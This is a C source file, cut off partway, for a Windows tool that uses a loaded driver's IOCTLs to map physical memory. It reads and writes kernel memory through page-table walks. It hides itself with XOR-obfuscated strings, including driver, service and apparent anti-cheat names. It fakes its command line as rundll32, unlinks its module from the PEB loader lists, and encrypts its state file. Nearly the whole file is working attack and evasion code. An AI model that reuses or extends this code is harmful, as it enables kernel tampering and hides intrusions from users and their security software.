#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <stdarg.h>
#include <stdint.h>
#include <io.h>
#include <fcntl.h>
#include <process.h>

#define ON_STATE_LEN 11
static const unsigned char ON_STATE[22] = {0x2d,0x5b,0x31,0x5d,0x3d,0x5f,0x01,0x61,0x01,0x63,0x0c,0x65,0x03,0x67,0x46,0x69,0x0e,0x6b,0x0d,0x6d,0x1a,0x6f};
#define ON_DTL_LEN 11
static const unsigned char ON_DTL[22] = {0x2d,0x5b,0x31,0x5d,0x3d,0x5f,0x01,0x61,0x01,0x63,0x0c,0x65,0x03,0x67,0x46,0x69,0x0e,0x6b,0x18,0x6d,0x02,0x6f};
#define ON_TRC_LEN 11
static const unsigned char ON_TRC[22] = {0x2d,0x5b,0x31,0x5d,0x3d,0x5f,0x01,0x61,0x01,0x63,0x0c,0x65,0x03,0x67,0x46,0x69,0x1e,0x6b,0x1e,0x6d,0x0d,0x6f};
#define ON_DRV_LEN 39
static const unsigned char ON_DRV[78] = {0x19,0x5b,0x66,0x5d,0x02,0x5f,0x37,0x61,0x0b,0x63,0x0a,0x65,0x02,0x67,0x07,0x69,0x1d,0x6b,0x1f,0x6d,0x32,0x6f,0x23,0x71,0x0b,0x73,0x07,0x75,0x02,0x77,0x1d,0x79,0x17,0x7b,0x4f,0x7d,0x4c,0x7f,0xdc,0x81,0xe6,0x83,0xf6,0x85,0xef,0x87,0xfe,0x89,0xef,0x8b,0xfe,0x8d,0xfd,0x8f,0xcc,0x91,0xf3,0x93,0xf7,0x95,0xe6,0x97,0xf1,0x99,0xff,0x9b,0xe4,0x9d,0xac,0x9f,0x8e,0xa1,0xd1,0xa3,0xdd,0xa5,0xd5,0xa7};

static wchar_t *oname(const unsigned char *src, int wlen)
{
    static wchar_t buf[4][96];
    static int alt;
    wchar_t *d = buf[alt = (alt + 1) & 3];
    for (int i = 0; i < wlen; i++)
        d[i] = (wchar_t)((src[2*i]     ^ (0x5A + 2*i)) & 0xff)
             | ((wchar_t)((src[2*i+1] ^ (0x5A + 2*i + 1)) & 0xff) << 8);
    d[wlen] = 0;
    return d;
}

static unsigned long long sm_step(unsigned long long *x)
{
    unsigned long long z = (*x += 0x9E3779B97F4A7C15ULL);
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    return z ^ (z >> 31);
}
static unsigned long long boot_seed(void)
{
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    unsigned long long now = (((unsigned long long)ft.dwHighDateTime << 32)
                              | ft.dwLowDateTime) / 10000ULL;
    unsigned long long s = (now - GetTickCount64()) >> 17;
    wchar_t cn[64];
    DWORD cnl = 63;
    if (!GetComputerNameW(cn, &cnl)) { cn[0] = 0; cnl = 0; }
    for (DWORD i = 0; i < cnl; i++)
        s = (s ^ (unsigned long long)(unsigned short)cn[i]) * 0x100000001B3ULL;
    return s;
}
#define PHYSRW_PIPE pn_buf
static volatile LONG g_daemon;           // 1 inside the daemon process
static int g_fresh_load;                 // 1 = THIS process loaded the image
                                         // (0 = reopened an existing device)
static CRITICAL_SECTION g_disp;          // serializes non-streaming commands
static __thread FILE *t_out;             // per-connection output sink
static __thread int   t_dead;            // client pipe broke - stop streaming
static __thread int   t_autopin;         // rd_phys pins blocks it touches (windows only)
static __thread int   t_unpin;           // driverless read missed the pin set
static __thread UINT32 t_cli_pid;         // pipe client pid - excluded from walks
                                            // (its fresh EPROCESS would pin-miss
                                            // every single procs call)
static __thread int   pa_nc;             // pa_of: skip v2p cache (fresh walk)

static wchar_t *xo_w(wchar_t *buf, size_t cap, const unsigned char *ob, size_t n)
{
    size_t i;
    for (i = 0; i < n && i + 1 < cap; i++)
        buf[i] = (wchar_t)(ob[i] ^ (unsigned char)(0x5A + (i & 15)));
    buf[i] = 0;
    return buf;
}
static char *xo_a(char *buf, size_t cap, const unsigned char *ob, size_t n)
{
    size_t i;
    for (i = 0; i < n && i + 1 < cap; i++)
        buf[i] = (char)(ob[i] ^ (unsigned char)(0x5A + (i & 15)));
    buf[i] = 0;
    return buf;
}
static const unsigned char OB_CVG[6] = {44,60,55,57,63,43};
#define OB_CVG_N 6
static const unsigned char OB_CUN[6] = {47,53,48,50,63,59};
#define OB_CUN_N 6
static const unsigned char OB_COM[7] = {53,54,47,41,44,54,16};
#define OB_COM_N 7
static const unsigned char OB_CHD[4] = {50,50,56,56};
#define OB_CHD_N 4
static int wq(const wchar_t *a, const unsigned char *ob, size_t n)
{ static wchar_t b[16]; xo_w(b, 16, ob, n); return !wcscmp(a, b); }
static const unsigned char OB_CDS[5] = {62,40,40,50,46};
#define OB_CDS_N 5
static const unsigned char OB_CDT[6] = {62,40,40,60,44,43};
#define OB_CDT_N 6
static const unsigned char OB_CDD[8] = {5,4,56,46,42,62,18,21};
#define OB_CDD_N 8
static const unsigned char OB_CW0[6] = {45,58,40,62,54,111};
#define OB_CW0_N 6
static const unsigned char OB_CF0[7] = {60,41,57,56,36,58,80};
#define OB_CF0_N 7
static const unsigned char OB_CPR[7] = {42,41,51,63,59,45,4};
#define OB_CPR_N 7
static const unsigned char OB_CPW[7] = {42,41,51,63,59,40,18};
#define OB_CPW_N 7
static const unsigned char OB_CSP[7] = {41,62,40,45,63,43,8};
#define OB_CSP_N 7
static const unsigned char OB_CMS[7] = {55,58,44,46,59,51,6};
#define OB_CMS_N 7
static const unsigned char OB_CMB[6] = {55,58,44,63,55,56};
#define OB_CMB_N 6
static const unsigned char OB_CFM[7] = {60,46,48,49,51,62,16};
#define OB_CFM_N 7
static const wchar_t *dq(const unsigned char *ob, size_t n)
{ static wchar_t bufs[8][24]; static int k; wchar_t *b = bufs[k = (k + 1) & 7];
  xo_w(b, 24, ob, n); return b; }
static const unsigned char OB_DMC[56] = {25,97,0,13,44,48,7,19,3,14,32,4,18,6,52,36,51,56,46,50,45,48,6,21,62,52,13,11,2,8,31,26,6,31,57,43,55,60,5,44,7,23,5,1,7,19,9,42,59,56,52,56,2,122,12,18};
#define OB_DMC_N 56
static const unsigned char OB_WHEA[33] = {127,55,47,1,13,38,19,21,7,14,87,87,58,3,26,0,44,62,46,46,2,40,8,4,3,70,84,81,30,73,27,16,41};
#define OB_WHEA_N 33
static const unsigned char OB_DMRC[13] = {62,54,46,62,123,111,80,85,26,77,23,28,21}; // dmrc%04x.sys
#define OB_DMRC_N 13
static const unsigned char OB_CFD[8] = {57,61,59,57,112,43,24,21};                   // cfgd.txt
#define OB_CFD_N 8
static const unsigned char OB_VGK[3] = {44,60,55};                                   // "vgk"
#define OB_VGK_N 3
static const unsigned char OB_TD66[14] = {6,7,114,1,42,0,4,87,84,83,2,6,81,85};
#define OB_TD66_N 14
static const unsigned char OB_PIPE[39] = {6,7,114,1,46,54,16,4,62,24,65,85,94,63,69,76,106,111,4,112,123,111,84,57,79,70,84,81,62,74,77,89,110,3,121,109,102,7,29};
#define OB_PIPE_N 39
static const unsigned char OB_AUTH[13] = {123,58,41,41,54,127,69,81,83,85,8,9,30};
#define OB_AUTH_N 13
static const unsigned char OB_SVCA[37] = {9,2,15,9,27,18,60,34,23,17,22,0,8,19,43,6,52,47,46,50,50,12,5,21,62,48,1,23,16,14,11,12,41,7,121,49,45};
#define OB_SVCA_N 37
static const unsigned char OB_SVCN[55] = {6,9,57,58,55,44,20,19,27,63,41,4,5,15,1,7,63,7,15,36,45,43,5,12,62,32,17,23,20,2,6,29,25,52,50,41,44,48,12,50,7,23,56,54,3,21,30,0,57,62,47,1,123,51,19};
#define OB_SVCN_N 55
static const unsigned char OB_S0[5] = {51,52,49,60,46};
#define OB_S0_N 5
static const unsigned char OB_S1[6] = {42,51,37,48,59,50};
#define OB_S1_N 6
static const unsigned char OB_S2[7] = {42,54,57,48,61,43,12};
#define OB_S2_N 7
static const unsigned char OB_S3[4] = {50,44,53,50};
#define OB_S3_N 4
static const unsigned char OB_S4[6] = {42,51,37,46,55,48};
#define OB_S4_N 6
static const unsigned char OB_S5[6] = {55,62,49,48,63,47};
#define OB_S5_N 6
static const unsigned char OB_S6[6] = {51,52,63,41,44,51};
#define OB_S6_N 6
static const unsigned char OB_S7[6] = {62,62,42,48,59,50};
#define OB_S7_N 6
static const unsigned char OB_L0[7] = {51,52,49,60,46,111,81};
#define OB_L0_N 7
static const unsigned char OB_L1[7] = {42,51,37,48,59,50,82};
#define OB_L1_N 7
static const unsigned char OB_L2[7] = {42,54,57,48,61,43,12};
#define OB_L2_N 7
static const unsigned char OB_L3[6] = {50,44,53,50,110,104};
#define OB_L3_N 6

static HINSTANCE g_self;
static void set_self_mod(HINSTANCE h)
{
    HMODULE m = NULL;
    if (!GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                            (LPCWSTR)(void *)&set_self_mod, &m))
        m = NULL;
    g_self = m;                           // NULL => ldr_unlink_self returns
    (void)h;
}

static void peb_scrub(void)
{
    wchar_t *real = GetCommandLineW();
    if (!real) return;
    unsigned short rlen = (unsigned short)(wcslen(real) * 2);
    unsigned char *peb = (unsigned char *)__readgsqword(0x60);
    if (!peb) return;
    unsigned char *pp = *(unsigned char **)(peb + 0x20);   // ProcessParameters
    if (!pp) return;
    static wchar_t decoy[] = L"rundll32.exe shell32.dll,Control_RunDLL";
    for (unsigned off = 0x38; off <= 0x78; off += 8) {     // US structs, 8-align
        unsigned short len = *(unsigned short *)(pp + off);
        wchar_t *buf = *(wchar_t **)(pp + off + 8);
        if (len == rlen && buf && !wcsncmp(buf, real, rlen / 2)) {
            *(unsigned short *)(pp + off)     = sizeof decoy - 2;
            *(unsigned short *)(pp + off + 2) = sizeof decoy;
            *(wchar_t **)(pp + off + 8)       = decoy;
        }
    }
}

#ifdef DBG_FILE
#include <winnt.h>
static FILE *dbg_f(void)
{
    char p[MAX_PATH]; DWORD n = GetEnvironmentVariableA("TEMP", p, MAX_PATH);
    if (!n) return NULL; strcat_s(p, MAX_PATH, "\\it9dbg.txt");
    return fopen(p, "a");
}
static void dbg_mk(const char *m, unsigned long v)
{
    FILE *f = dbg_f(); if (!f) return;
    fprintf(f, "%s=%lx\n", m, v); fclose(f);
}
static int ldr_unlink_guarded(void);
static void ldr_unlink_self(void)
{
    dbg_mk("enter", (unsigned long)(uintptr_t)g_self);
    int r = ldr_unlink_guarded();
    dbg_mk("done", (unsigned long)r);
}
static int ldr_unlink_guarded(void)
{
    if (!g_self) return 0;
    unsigned char *peb = (unsigned char *)__readgsqword(0x60);
    if (!peb) return 0;
    unsigned char *ldr = *(unsigned char **)(peb + 0x18);  // PEB->Ldr
    if (!ldr) return 0;
    LIST_ENTRY *head = (LIST_ENTRY *)(ldr + 0x10);         // InLoadOrder head
    dbg_mk("peb", (unsigned long)(uintptr_t)peb);
    dbg_mk("ldr", (unsigned long)(uintptr_t)ldr);
    int n = 0;
    for (LIST_ENTRY *le = head->Flink; le && le != head; le = le->Flink) {
        n++;
        unsigned char *e = (unsigned char *)le;
        if (*(HINSTANCE *)(e + 0x30) == g_self) {          // DllBase
            dbg_mk("found", (unsigned long)n);
            for (int k = 0; k < 3; k++) {                  // three link arrays
                LIST_ENTRY *l = (LIST_ENTRY *)(e + 0x10 * k);
                dbg_mk("k", (unsigned long)k);
                l->Blink->Flink = l->Flink;
                l->Flink->Blink = l->Blink;
                l->Flink = l->Blink = l;                   // dead self-loop
            }
            dbg_mk("unlinked", 1);
            return 1;
        }
    }
    dbg_mk("nomatch", (unsigned long)n);
    return 0;
}
#else
static void ldr_unlink_self(void)
{
    if (!g_self) return;
    unsigned char *peb = (unsigned char *)__readgsqword(0x60);
    if (!peb) return;
    unsigned char *ldr = *(unsigned char **)(peb + 0x18);  // PEB->Ldr
    if (!ldr) return;
    LIST_ENTRY *head = (LIST_ENTRY *)(ldr + 0x10);         // InLoadOrder head
    for (LIST_ENTRY *le = head->Flink; le && le != head; le = le->Flink) {
        unsigned char *e = (unsigned char *)le;
        if (*(HINSTANCE *)(e + 0x30) == g_self) {          // DllBase
            for (int k = 0; k < 3; k++) {                  // three link arrays
                LIST_ENTRY *l = (LIST_ENTRY *)(e + 0x10 * k);
                l->Blink->Flink = l->Flink;
                l->Flink->Blink = l->Blink;
                l->Flink = l->Blink = l;                   // dead self-loop
            }
            break;
        }
    }
}
#endif

static void self_tarnen(void)
{
#ifdef NO_HIDE
    return;
#endif
#ifdef PEB_ONLY
    peb_scrub(); return;
#endif
#ifdef LDR_ONLY
    ldr_unlink_self(); return;
#endif
#ifdef DBG_FILE
    ldr_unlink_self(); return;
#endif
    peb_scrub();
    ldr_unlink_self();
}


static int physrw_printf(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    FILE *o = t_out ? t_out : stdout;
    int n = vfprintf(o, fmt, ap);
    va_end(ap);
    if (o != stdout && (n < 0 || ferror(o))) t_dead = 1;  // client gone
    return n;
}
#define printf physrw_printf

// device name = the service name it was loaded under (\\.\t_d660fc72 legacy;
// stealth_load instances use their own benign name) - resolved in open_dev
static wchar_t g_dev[80];
#define MAP   0x8011E044
#define UNMAP 0x8011E048

#pragma pack(push,1)
typedef struct {         // 45 = 0x2d bytes, inlen checked == 0x2d exactly
    UINT64 handle;       // +0x00 out (section handle, closed by driver)
    UINT64 kva1;         // +0x08 out (MmMapIoSpace kva - fallback path only)
    UINT64 kva2;         // +0x10 out (MDL - fallback path only)
    UINT32 size;         // +0x18 in view size (client: 0x10000 always)
    UINT64 phys;         // +0x1c in/out: requested PA in, 64K-ROUNDED PA out
    UINT64 base;         // +0x24 out user VA of the mapping
    UINT8  write;        // +0x2c in 1=RW 0=RO
} LOOPMAP;
#pragma pack(pop)

#pragma pack(push,1)
typedef struct {
    LOOPMAP m;     // full driver struct - reused verbatim for 0x8011E048 UNMAP
    UINT64  at;    // VA of the exact requested byte (base + delta)
} MAPVIEW;
#pragma pack(pop)

static HANDLE hdev;

// verified map/unmap core (copied from looplpt.c, unchanged semantics)

static int g_quiet;                     // suppress per-page errors during PA scans

static BOOL wmap(UINT64 pa, UINT32 len, MAPVIEW *v, BOOL write)
{
    (void)len;
    memset(&v->m, 0, sizeof v->m);
    // view must cover the full 64K-rounded block: driver rounds the section
    // offset DOWN to 64K; size < 0x10000 leaves tail pages unmapped
    v->m.size = 0x10000;
    v->m.phys = pa;
    v->m.write = write;
    DWORD n = 0;
    if (!DeviceIoControl(hdev, MAP, &v->m, sizeof v->m, &v->m, sizeof v->m, &n, NULL)) {
        if (!g_quiet) printf("[-] map pa=%llx err=%lu\n", (unsigned long long)pa, GetLastError());
        return FALSE;
    }
    if (!v->m.base) { if (!g_quiet) printf("[-] map pa=%llx no base\n", (unsigned long long)pa); return FALSE; }
    UINT64 delta = pa - v->m.phys;           // requested - kernel-rounded
    if (delta > 0xFFFF) { if (!g_quiet) printf("[-] map delta=%llx\n", (unsigned long long)delta); return FALSE; }
    v->at = v->m.base + delta;
    return TRUE;
}

static void wunmap(MAPVIEW *v)
{
    if (!v->m.base) { v->at = 0; return; }
    DWORD n = 0;
    if (!DeviceIoControl(hdev, UNMAP, &v->m, sizeof v->m, &v->m, sizeof v->m, &n, NULL))
        printf("[-] unmap base=%llx err=%lu\n", (unsigned long long)v->m.base, GetLastError());
    v->m.base = 0; v->at = 0;
}

// off != 0: probe exactly where we access. v.at is the requested 4K-aligned
// page - memcpy without +off silently hit page+0 (0x133 root cause).
static BOOL readable(MAPVIEW *v, UINT32 off, UINT32 c)
{
    if (IsBadReadPtr((void *)(v->at + off), c)) { wunmap(v); return FALSE; }
    return TRUE;
}

static BOOL writeable(MAPVIEW *v, UINT32 off, UINT32 c)
{
    if (IsBadWritePtr((void *)(v->at + off), c)) { wunmap(v); return FALSE; }
    return TRUE;
}

#define GETSEC 0x8011607C
typedef LONG NTSTATUS_t;
typedef NTSTATUS_t (WINAPI *PNtMVoS)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
                                     PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
static HANDLE hsec;
static int g_path;                      // 0 = E044 driver views, 1 = usermode handle

static BOOL fetch_sec(void)
{
    DWORD n = 0; UINT64 h = 0;
    if (!DeviceIoControl(hdev, GETSEC, NULL, 0, &h, 8, &n, NULL) || n != 8 || !h) {
        printf("[-] getsec err=%lu n=%lu\n", GetLastError(), n);
        return FALSE;
    }
    hsec = (HANDLE)h;
    printf("[+] usermode physmem handle 0x%llx\n", (unsigned long long)h);
    return TRUE;
}

static BOOL urd_phys(UINT64 pa, void *out, UINT32 len)
{
    static PNtMVoS pMap;
    if (!pMap) {
        pMap = (PNtMVoS)(void *)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                                               "NtMapViewOfSection");
        if (!pMap) { printf("[-] no NtMapViewOfSection\n"); return FALSE; }
    }
    while (len) {
        UINT32 off = (UINT32)(pa & 0xFFF);
        UINT32 c = 0x1000 - off; if (c > len) c = len;
        PVOID base = NULL; SIZE_T sz = 0x1000; LARGE_INTEGER sec;
        sec.QuadPart = (LONGLONG)(pa & ~0xFFFULL);
        NTSTATUS_t s = pMap(hsec, GetCurrentProcess(), &base, 0, 0, &sec, &sz,
                            1 /*ViewShare*/, 0, 2 /*PAGE_READONLY*/);
        if (s < 0) {
            if (!g_quiet) printf("[-] umap pa=%llx status=%lx\n",
                                 (unsigned long long)pa, (unsigned long)s);
            return FALSE;
        }
        if (IsBadReadPtr(base, c)) {
            UnmapViewOfFile(base);
            if (!g_quiet) printf("[-] umap dead view pa=%llx\n", (unsigned long long)pa);
            return FALSE;
        }
        memcpy(out, (char *)base + off, c);
        UnmapViewOfFile(base);
        pa += c; out = (char *)out + c; len -= c;
    }
    return TRUE;
}

#define PINMAX 256
static struct { UINT64 blk, base, last; int dead; } pins[PINMAX];
static int pin_n;
static CRITICAL_SECTION g_pin;
static LONG g_pin_once;

static void pin_lock(void)
{
    if (!InterlockedCompareExchange(&g_pin_once, 1, 0))
        InitializeCriticalSection(&g_pin);
    EnterCriticalSection(&g_pin);
}
#define pin_unlock() LeaveCriticalSection(&g_pin)

// adopt an already-mapped 64K E044 view (rd_phys autopin path). The table is
// LRU; eviction unwinds through the driver, so it needs the window we are in.
static void pin_adopt(MAPVIEW *v)
{
    if (!v->m.base) return;
    UINT64 blk = v->m.phys;
    if (blk >= 0xC0000000ULL && blk < 0x100000000ULL) { wunmap(v); return; }// MMIO law
    pin_lock();
    for (int i = 0; i < pin_n; i++)
        if (pins[i].blk == blk && !pins[i].dead) {
            pins[i].last = GetTickCount64();
            pin_unlock();
            wunmap(v);                       // duplicate: caller's copy goes
            return;
        }
    int slot = -1;
    if (pin_n < PINMAX) slot = pin_n++;
    else {
        UINT64 oldest = ~0ULL;
        for (int i = 0; i < pin_n; i++)
            if (!pins[i].dead && pins[i].last < oldest) { oldest = pins[i].last; slot = i; }
        if (slot < 0) { pin_unlock(); wunmap(v); return; }  // all dead: no slot
    }
    pins[slot].blk = blk; pins[slot].base = v->m.base;
    pins[slot].last = GetTickCount64(); pins[slot].dead = 0;
    pin_unlock();
    // the view STAYS mapped - v.m.base is now owned by the table
}

// pin an arbitrary PA (64K block) - requires a live device window.
static void pin_add(UINT64 pa)
{
    if (!(hdev && hdev != INVALID_HANDLE_VALUE)) return;
    UINT64 blk = pa & ~0xFFFFULL;
    if (blk >= 0xC0000000ULL && blk < 0x100000000ULL) return;  // MMIO law
    for (int i = 0; i < pin_n; i++)
        if (pins[i].blk == blk && !pins[i].dead) return;
    MAPVIEW v;
    if (!wmap(blk, 0x10000, &v, 0)) return;
    pin_adopt(&v);
}

// driverless read from the pin set; len may cross 64K blocks (per-4K loop)
static BOOL pin_read(UINT64 pa, void *out, UINT32 len)
{
    if (!pin_n) return FALSE;
    UINT32 left = len; UINT64 p2 = pa; char *o2 = (char *)out;
    pin_lock();
    while (left) {
        UINT32 c = 0x1000 - (UINT32)(p2 & 0xFFF); if (c > left) c = left;
        UINT64 blk = p2 & ~0xFFFFULL;
        unsigned char *q = NULL;
        for (int i = 0; i < pin_n; i++)
            if (pins[i].blk == blk && !pins[i].dead) {
                q = (unsigned char *)(pins[i].base + (p2 - blk));
                pins[i].last = GetTickCount64();
                break;
            }
        if (!q || IsBadReadPtr(q, c)) { pin_unlock(); return FALSE; }
        memcpy(o2, q, c);
        p2 += c; o2 += c; left -= c;
    }
    pin_unlock();
    return TRUE;
}

static BOOL rd_phys(UINT64 pa, void *out, UINT32 len)
{
    if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) return FALSE; // MMIO hole law
    if (pin_read(pa, out, len)) return TRUE;         // persistent pins: driverless
    if (!(hdev && hdev != INVALID_HANDLE_VALUE) && !(g_path == 1 && hsec)) {
        t_unpin = 1;                                 // no window, not pinned
        return FALSE;
    }
    if (g_path == 1 && hsec) {
        BOOL ok = urd_phys(pa, out, len);
        if (ok && t_autopin) {
            UINT64 p2 = pa;
            for (UINT32 l = 0; l < len; l += 0x1000, p2 += 0x1000)
                pin_add(p2 & ~0xFFFULL);
        }
        return ok;
    }
    while (len) {
        UINT64 page = pa & ~0xFFFULL;
        UINT32 off  = (UINT32)(pa & 0xFFF);
        UINT32 c = 0x1000 - off; if (c > len) c = len;
        MAPVIEW v;
        if (!wmap(page, 0x1000, &v, 0)) return FALSE;
        if (!readable(&v, off, c)) return FALSE;
        memcpy(out, (char *)v.at + off, c);
        if (t_autopin) pin_adopt(&v);
        else wunmap(&v);
        pa += c; out = (char *)out + c; len -= c;
    }
    return TRUE;
}

static BOOL wr_phys(UINT64 pa, const void *in, UINT32 len)
{
    while (len) {
        UINT64 page = pa & ~0xFFFULL;
        UINT32 off  = (UINT32)(pa & 0xFFF);
        UINT32 c = 0x1000 - off; if (c > len) c = len;
        MAPVIEW v;
        if (!wmap(page, 0x1000, &v, 1)) return FALSE;
        if (!writeable(&v, off, c)) return FALSE;
        memcpy((char *)v.at + off, in, c);
        wunmap(&v);
        pa += c; in = (const char *)in + c; len -= c;
    }
    return TRUE;
}

static UINT64 pa_of(UINT64 cr3, UINT64 va)
{
    static __thread struct { UINT64 dtb, vpg, ppg; } cache[16];
    UINT64 vpg = va & ~0xFFFULL;
    if (!pa_nc)                                // streams walk fresh every sample
        for (int i = 0; i < 16; i++)
            if (cache[i].dtb == (cr3 & ~0xFFFULL) && cache[i].vpg == vpg && cache[i].ppg)
                return cache[i].ppg | (va & 0xFFF);
    UINT64 e, pa = cr3 & 0x000FFFFFFFFFF000ULL;
    for (int lvl = 0; lvl < 4; lvl++) {
        if (!rd_phys(pa + 8 * ((va >> (39 - 9 * lvl)) & 0x1FF), &e, 8)) return 0;
        if (!(e & 1)) return 0;
        pa = e & 0x000FFFFFFFFFF000ULL;
        if (lvl >= 1 && (e & 0x80)) {         // large page (1G/2M)
            int shift = lvl == 1 ? 30 : 21;
            return pa + (va & ((1ULL << shift) - 1));  // large pages: no cache
        }
    }
    static __thread int ci;
    if (!pa_nc) {
        cache[ci].dtb = cr3 & ~0xFFFULL; cache[ci].vpg = vpg; cache[ci].ppg = pa;
        ci = (ci + 1) & 15;
    }
    return pa + (va & 0xFFF);
}

static BOOL rd_kva(UINT64 cr3, UINT64 va, void *out, UINT32 len)
{
    while (len) {
        UINT32 c = 0x1000 - (UINT32)(va & 0xFFF); if (c > len) c = len;
        UINT64 pa = pa_of(cr3, va);
        if (!pa) return FALSE;
        if (!rd_phys(pa, out, c)) return FALSE;
        va += c; out = (char *)out + c; len -= c;
    }
    return TRUE;
}

static BOOL wr_kva(UINT64 cr3, UINT64 va, const void *in, UINT32 len)
{
    while (len) {
        UINT32 c = 0x1000 - (UINT32)(va & 0xFFF); if (c > len) c = len;
        UINT64 pa = pa_of(cr3, va);
        if (!pa) return FALSE;
        if (!wr_phys(pa, in, c)) return FALSE;
        va += c; in = (const char *)in + c; len -= c;
    }
    return TRUE;
}

static void hexdump(UINT64 base, const unsigned char *m, UINT32 n)
{
    for (UINT32 i = 0; i < n; i += 16) {
        printf("  %016llx ", (unsigned long long)(base + i));
        for (UINT32 j = 0; j < 16 && i + j < n; j++) printf("%02x ", m[i + j]);
        printf("\n");
    }
}

static void hexline(const unsigned char *m, UINT32 n)
{
    for (UINT32 i = 0; i < n; i++) printf("%02x", m[i]);
}

static void stamp_ms(UINT64 t0)
{
    ULONGLONG d = GetTickCount64() - t0;
    SYSTEMTIME st;
    GetLocalTime(&st);
    printf("[+%llu.%03llu %02u:%02u:%02u.%03u]",
           (unsigned long long)(d / 1000), (unsigned long long)(d % 1000),
           (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond,
           (unsigned)st.wMilliseconds);
}

// state file: "cr3 <hex>\nnt <hex>\nsep <hex>\n", reloaded every invocation

static struct { UINT64 cr3, nt, sep; int path; wchar_t devn[80]; } st;
static int load_state(void);

static void pipe_name(wchar_t *out, size_t cap)
{
    load_state();
    unsigned long long x = boot_seed() ^ 0xD1CEB0BACAFEF00DULL;
    if (st.cr3 && st.sep)
        x = (st.cr3 * 0x9E3779B97F4A7C15ULL)
          ^ (st.sep  * 0xC2B2AE3D27D4EB4FULL)
          ^ 0xD1CEB0BACAFEF00DULL;
    unsigned a = (unsigned)(sm_step(&x) >> 32);
    unsigned b = (unsigned)(sm_step(&x) & 0xFFFF);
    unsigned c = (unsigned)((sm_step(&x) & 0x0FFF) | 0x4000);  // GUID v4
    unsigned d = (unsigned)((sm_step(&x) & 0x3FFF) | 0x8000);  // variant
    unsigned e = (unsigned)(sm_step(&x) & 0xFFFF);
    unsigned f = (unsigned)(sm_step(&x) >> 32);
    _snwprintf(out, cap, xo_w((wchar_t[64]){0}, 64, OB_PIPE, OB_PIPE_N),
               a, b, c, d, e, f);
    out[cap - 1] = 0;
}

static unsigned long long pipe_secret(void)
{
    load_state();
    unsigned long long x = boot_seed() ^ 0x5EEDC0DE5EEDC0DEULL;
    if (st.cr3 && st.sep)
        x = (st.cr3 * 0x2545F4914F6CDD1DULL)
          ^ (st.sep  * 0x9E3779B97F4A7C15ULL)
          ^ 0x5EEDC0DE5EEDC0DEULL;
    unsigned long long a = sm_step(&x);
    unsigned long long b = sm_step(&x);
    return (a * 0x9E3779B97F4A7C15ULL) ^ b;
}
static wchar_t SPATH_CANON[MAX_PATH] = L"";
static wchar_t SPATH_EXEDIR[MAX_PATH] = L"";  // set once, first use
static wchar_t SPATH_C[MAX_PATH]     = L"";
static const wchar_t *SPATHS[3];

static void spaths_init(void)
{
    static int done;
    if (done) return;
    done = 1;
    wchar_t *nm = oname(ON_STATE, ON_STATE_LEN);
    _snwprintf(SPATH_CANON, MAX_PATH, xo_w((wchar_t[128]){0}, 128, OB_DMC, OB_DMC_N), nm);
    SPATH_CANON[MAX_PATH - 1] = 0;
    SPATHS[0] = SPATH_CANON;
    wchar_t dw[MAX_PATH];
    if (GetModuleFileNameW(NULL, dw, MAX_PATH)) {
        wchar_t *s = wcsrchr(dw, L'\\');
        if (s) {
            s[1] = 0;
            wcsncat(dw, nm, MAX_PATH - wcslen(dw) - 1);
            wcsncpy(SPATH_EXEDIR, dw, MAX_PATH - 1);
            SPATH_EXEDIR[MAX_PATH - 1] = 0;
            SPATHS[1] = SPATH_EXEDIR;
        }
    }
    _snwprintf(SPATH_C, MAX_PATH, L"C:\\%ls", nm);
    SPATH_C[MAX_PATH - 1] = 0;
    SPATHS[2] = SPATH_C;
}

// state content is rolling-XOR'd (key 0xC3+index) - binary noise on disk
static void xdata(char *p, size_t n)
{
    for (size_t i = 0; i < n; i++) p[i] ^= (char)(0xC3 + i);
}

static void parse_state_text(char *txt)
{
    unsigned long long v;
    for (char *line = strtok(txt, "\n"); line; line = strtok(NULL, "\n")) {
        if (sscanf(line, " idx %llx", &v) == 1) st.cr3 = v;
        else if (sscanf(line, " alg %llx", &v) == 1)  st.nt = v;
        else if (sscanf(line, " org %llx", &v) == 1) st.sep = v;
        else {
            int p;
            if (sscanf(line, " key %d", &p) == 1) st.path = p;
            else {
                char dv[80];
                if (sscanf(line, " loc %79s", dv) == 1) {
                    size_t k;
                    for (k = 0; dv[k] && k < 79; k++) st.devn[k] = (wchar_t)dv[k];
                    st.devn[k] = 0;
                }
            }
        }
    }
}

static int load_state(void)
{
    spaths_init();
    for (int i = 0; i < 3; i++) {
        if (!SPATHS[i]) continue;
        FILE *f = _wfopen(SPATHS[i], L"rb");
        if (!f) continue;
        static char buf[2048];
        size_t n = fread(buf, 1, sizeof buf - 1, f);
        fclose(f);
        if (!n) continue;
        buf[n] = 0;
        xdata(buf, n);
        parse_state_text(buf);
        printf("[state] %ls cr3=%llx nt=%llx sep=%llx path=%d\n", SPATHS[i],
               (unsigned long long)st.cr3, (unsigned long long)st.nt,
               (unsigned long long)st.sep, st.path);
        return 1;
    }
    return 0;
}

static int save_state(void)
{
    spaths_init();
    char txt[512];
    int n = snprintf(txt, sizeof txt, "idx %llx\nalg %llx\norg %llx\nkey %d\n",
                     (unsigned long long)st.cr3, (unsigned long long)st.nt,
                     (unsigned long long)st.sep, st.path);
    if (st.devn[0] && n > 0)
        n += _snprintf(txt + n, sizeof txt - (size_t)n, "loc %ls\n", st.devn);
    if (n <= 0) { printf("[-] state build failed\n"); return 0; }
    for (int i = 0; i < 3; i++) {
        if (!SPATHS[i]) continue;
        FILE *f = _wfopen(SPATHS[i], L"rb");
        if (!f) continue;
        static char old[512];
        size_t on = fread(old, 1, sizeof old, f);
        fclose(f);
        if (on == (size_t)n) {
            xdata(old, on);
            if (!memcmp(old, txt, on)) {
                return 1;                      // bit-identical: leave the file alone
            }
        }
        break;                                 // first existing copy is the live one
    }
